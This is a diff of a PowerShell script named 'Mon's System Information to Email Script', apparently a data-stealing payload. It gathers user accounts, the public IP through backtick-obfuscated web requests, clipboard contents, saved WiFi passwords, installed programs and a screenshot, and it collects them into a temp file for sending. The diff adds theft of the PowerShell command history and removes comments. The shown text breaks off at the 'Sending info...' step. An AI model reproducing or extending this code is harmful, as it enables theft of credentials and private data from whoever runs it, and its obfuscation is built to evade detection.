@@ -1,4 +1,4 @@
-﻿<#
+<#
 ============================================= Mon's System Information to Email Script ========================================================
 
 SYNOPSIS
@@ -32,7 +32,7 @@ $userString = "Username: $($userInfo.Name)"
 $userString += "`nFull Name: $($userInfo.FullName)`n"
 
 $userString+="Public Ip Address = "
-$userString+=((Inv`o`ke-`W`ebR`e`qu`e`st ifconfig.me/ip).Content.Trim() | Out-String)
+$userString+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
 $userString+="`n"
 $userString+="All User Accounts: `n"
 $userString+= Get-WmiObject -Class Win32_UserAccount
@@ -78,13 +78,16 @@ $wifistring+="SSID: $ssid`nPassword: $pass`n"}}}$a++;}
 
 #--------------------------------- Save Collected info ---------------------------------------
 
-# Save the information to a text file
+$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
 "------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
 $userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "------------------------   CLIPBOARD INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+"------------------------   POWERSHELL HISTORY --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+Get-Content $pshist | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 $systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
@@ -95,30 +98,24 @@ $wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -App
 "------------------------ PROGRAMS INFO --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 $programsString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 
-# Output a message to the console
 Write-Output "System and user information saved to text file."
 
 #====================================================================== TAKE SCREENSHOT ==============================================================================
 
-    $Filett = "$env:temp\SC.png"
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-type -AssemblyName System.Drawing
-    # Gather Screen resolution information
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-    # Create bitmap using the top-left and bottom-right bounds
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    # Create Graphics object
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    # Capture screen
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    # Save to file
-    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+$Filett = "$env:temp\SC.png"
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$Width = $Screen.Width
+$Height = $Screen.Height
+$Left = $Screen.Left
+$Top = $Screen.Top
+$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
 
-    Start-Sleep 3
+Start-Sleep 3
 
 #====================================================================== SEND ALL COLLECTED INFO ==============================================================================
 Write-Output "Sending info..."
